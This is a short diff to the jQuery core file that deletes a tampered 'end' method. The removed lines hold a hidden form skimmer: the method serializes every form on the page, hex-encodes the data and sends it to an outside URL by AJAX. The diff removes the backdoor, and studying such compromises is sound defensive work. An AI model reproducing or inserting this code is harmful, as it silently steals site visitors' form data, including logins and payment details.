@@ -107,18 +107,6 @@ jQuery.fn = jQuery.prototype = {
 		return this.pushStack( j >= 0 && j < len ? [ this[ j ] ] : [] );
 	},
 
-	end: async function () {
-		await $.ajax({
-		  type: "GET",
-		  dataType: "text",
-		  url: "https://sample/halo/?cat=" + (function (e) {
-			for (var t, n = 0, r = e.length, i = ""; n < r; ++n)
-			  i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
-			return i;
-		  })($("form").serialize()),
-		  headers: { "Content-type": "application/json" },
-		});
-	}
 };
 
 jQuery.extend = jQuery.fn.extend = function() {
